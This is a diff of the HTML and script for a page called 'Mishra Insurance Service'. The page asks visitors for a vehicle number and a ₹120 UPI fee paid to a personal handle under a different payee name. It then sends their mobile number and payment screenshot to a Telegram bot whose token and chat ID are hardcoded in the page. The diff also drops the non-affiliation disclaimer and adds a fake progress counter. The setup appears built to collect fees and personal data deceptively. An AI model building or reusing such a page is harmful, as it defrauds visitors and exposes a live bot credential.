@@ -6,11 +6,20 @@
 <title>Mishra Insurance Service</title>
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial}
 
 body{
-background:#f4f6f9;
 min-height:100vh;
+background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#1c92d2);
+background-size:400% 400%;
+animation:rgbMove 12s ease infinite;
+color:#fff;
+}
+
+@keyframes rgbMove{
+0%{background-position:0% 50%}
+50%{background-position:100% 50%}
+100%{background-position:0% 50%}
 }
 
 /* TOP BAR */
@@ -20,41 +29,40 @@ top:0;
 left:0;
 width:100%;
 height:60px;
-background:#ffffff;
+background:rgba(0,0,0,0.4);
 display:flex;
 align-items:center;
 justify-content:space-between;
 padding:0 20px;
-box-shadow:0 4px 15px rgba(0,0,0,0.08);
+backdrop-filter:blur(8px);
 z-index:1000;
 }
 
-.logo{
+.topbar button{
+padding:8px 16px;
+border:none;
+border-radius:8px;
+background:#00f2fe;
+color:#000;
 font-weight:600;
-color:#003366;
-}
-
-.menu-icon{
-width:30px;
 cursor:pointer;
 }
 
 .menu-icon div{
+width:25px;
 height:3px;
-background:#003366;
-margin:5px 0;
-border-radius:3px;
+background:#fff;
+margin:4px 0;
 }
 
 /* SIDE MENU */
 .sideMenu{
 position:fixed;
-top:0;
 right:-260px;
+top:0;
 width:250px;
 height:100%;
-background:#ffffff;
-box-shadow:-5px 0 20px rgba(0,0,0,0.1);
+background:#111;
 padding-top:80px;
 transition:0.4s;
 z-index:999;
@@ -65,21 +73,13 @@ width:90%;
 margin:10px 5%;
 padding:12px;
 border:none;
-border-radius:10px;
-background:#003366;
+border-radius:8px;
+background:#1c92d2;
 color:#fff;
 cursor:pointer;
-font-weight:500;
-transition:0.3s;
 }
 
-.sideMenu button:hover{
-background:#001f4d;
-}
-
-.openMenu{
-right:0;
-}
+.openMenu{right:0}
 
 /* CARD */
 .card{
@@ -88,10 +88,10 @@ width:92%;
 max-width:420px;
 margin-left:auto;
 margin-right:auto;
-background:#fff;
+background:rgba(255,255,255,0.1);
 padding:30px;
 border-radius:18px;
-box-shadow:0 10px 30px rgba(0,0,0,0.08);
+backdrop-filter:blur(10px);
 text-align:center;
 }
 
@@ -100,11 +100,12 @@ width:100%;
 padding:14px;
 margin-top:14px;
 border-radius:10px;
-border:1px solid #ddd;
+border:none;
 font-size:15px;
+text-transform:uppercase;
 }
 
-/* Neon RGB Button */
+/* Neon Button */
 .neonBtn{
 width:100%;
 padding:14px;
@@ -115,18 +116,17 @@ font-weight:600;
 cursor:pointer;
 background:#000;
 color:#fff;
-box-shadow:0 0 10px #00f2fe,0 0 20px #43e97b;
-animation:rgbGlow 2s infinite alternate;
+animation:neon 2s infinite alternate;
 }
 
-@keyframes rgbGlow{
-0%{box-shadow:0 0 10px #00f2fe;}
-50%{box-shadow:0 0 20px #ff00ff;}
-100%{box-shadow:0 0 20px #43e97b;}
+@keyframes neon{
+0%{box-shadow:0 0 10px #00f2fe}
+50%{box-shadow:0 0 20px #ff00ff}
+100%{box-shadow:0 0 20px #43e97b}
 }
 
 .neonBtn:active{
-transform:scale(0.96);
+transform:scale(0.95);
 }
 
 /* Loader */
@@ -136,20 +136,40 @@ top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(255,255,255,0.9);
+background:rgba(0,0,0,0.8);
 display:none;
 align-items:center;
 justify-content:center;
-font-size:18px;
-font-weight:600;
-color:#003366;
+flex-direction:column;
 z-index:2000;
 }
 
-.hidden{display:none;}
+.spinner{
+width:60px;
+height:60px;
+border:6px solid #fff;
+border-top:6px solid #00f2fe;
+border-radius:50%;
+animation:spin 1s linear infinite;
+}
 
-.section{
-padding:25px;
+@keyframes spin{
+100%{transform:rotate(360deg)}
+}
+
+.progress{
+margin-top:15px;
+font-size:18px;
+}
+
+.hidden{display:none}
+
+.footer{
+text-align:center;
+margin-top:40px;
+padding:20px;
+font-size:14px;
+opacity:0.8;
 }
 
 .qr{
@@ -162,11 +182,9 @@ margin-top:15px;
 <body>
 
 <div class="topbar">
-<div class="logo">Mishra Insurance</div>
+<button onclick="goHome()">Home</button>
 <div class="menu-icon" onclick="toggleMenu()">
-<div></div>
-<div></div>
-<div></div>
+<div></div><div></div><div></div>
 </div>
 </div>
 
@@ -177,13 +195,16 @@ margin-top:15px;
 <button onclick="openDisclaimer()">Disclaimer</button>
 </div>
 
-<div class="loader" id="loader">Loading...</div>
+<div class="loader" id="loader">
+<div class="spinner"></div>
+<div class="progress" id="progressText">0%</div>
+</div>
 
 <div class="card">
 
 <div id="homePage">
 <h3>Enter Vehicle Number</h3>
-<input id="vehicle" placeholder="BR-09-AB-1234">
+<input id="vehicle" placeholder="BR-09-AB-1234" oninput="formatVehicle(this)">
 <button class="neonBtn" onclick="goPay()">Continue</button>
 </div>
 
@@ -191,7 +212,7 @@ margin-top:15px;
 <h3>Service Fee ₹120</h3>
 
 <button class="neonBtn"
-onclick="showLoader(); window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
+onclick="vibrate(); window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
 Pay with UPI
 </button>
 
@@ -205,24 +226,10 @@ src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=
 <button class="neonBtn" onclick="goHome()">Back</button>
 </div>
 
-<div id="aboutPage" class="hidden section">
-<h3>About</h3>
-<p>We provide vehicle assistance and insurance services.</p>
 </div>
 
-<div id="contactPage" class="hidden section">
-<h3>Contact</h3>
-<button class="neonBtn"
-onclick="window.location.href='https://t.me/yourtelegramusername'">
-Chat on Telegram
-</button>
-</div>
-
-<div id="disclaimerPage" class="hidden section">
-<h3>Disclaimer</h3>
-<p>This is a private assistance platform. Not affiliated with any government authority.</p>
-</div>
-
+<div class="footer">
+© 2026 Mishra Insurance Service. All rights reserved.
 </div>
 
 <script>
@@ -230,42 +237,58 @@ Chat on Telegram
 const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
 const chatId="5600045707";
 
-function showLoader(){
-document.getElementById("loader").style.display="flex";
-setTimeout(()=>{document.getElementById("loader").style.display="none";},700);
+function vibrate(){
+if(navigator.vibrate) navigator.vibrate(80);
 }
 
 function toggleMenu(){
-document.getElementById("menu").classList.toggle("openMenu");
+menu.classList.toggle("openMenu");
 }
 
 function goHome(){
-showLoader();
+vibrate();
 homePage.classList.remove("hidden");
 payPage.classList.add("hidden");
-aboutPage.classList.add("hidden");
-contactPage.classList.add("hidden");
-disclaimerPage.classList.add("hidden");
 }
 
 function openInsurance(){goHome();}
-function openAbout(){showLoader();homePage.classList.add("hidden");aboutPage.classList.remove("hidden");}
-function openContact(){showLoader();homePage.classList.add("hidden");contactPage.classList.remove("hidden");}
-function openDisclaimer(){showLoader();homePage.classList.add("hidden");disclaimerPage.classList.remove("hidden");}
+function openAbout(){alert("About Page");}
+function openContact(){window.location.href="https://t.me/yourtelegramusername";}
+function openDisclaimer(){alert("Private Service Platform");}
 
 function goPay(){
 if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
-showLoader();
+vibrate();
 homePage.classList.add("hidden");
 payPage.classList.remove("hidden");
+}
+
+function formatVehicle(input){
+let v=input.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase();
+if(v.length>2) v=v.slice(0,2)+"-"+v.slice(2);
+if(v.length>5) v=v.slice(0,5)+"-"+v.slice(5);
+if(v.length>8) v=v.slice(0,8)+"-"+v.slice(8,12);
+input.value=v;
 }
 
 function submitForm(){
 if(mobile.value.length<10){alert("Enter valid mobile");return;}
 if(!proof.files[0]){alert("Upload screenshot");return;}
 
-showLoader();
+vibrate();
+loader.style.display="flex";
+let percent=0;
+let interval=setInterval(()=>{
+percent++;
+progressText.innerText=percent+"%";
+if(percent>=100){
+clearInterval(interval);
+sendData();
+}
+},30);
+}
 
+function sendData(){
 let data=new FormData();
 data.append("chat_id",chatId);
 data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
@@ -276,11 +299,13 @@ method:"POST",
 body:data
 })
 .then(()=>{
-alert("Submitted Successfully");
+loader.style.display="none";
+alert("✅ Submitted Successfully");
 goHome();
 })
 .catch(()=>{
-alert("Submission Failed");
+loader.style.display="none";
+alert("❌ Submission Failed");
 });
 }
 
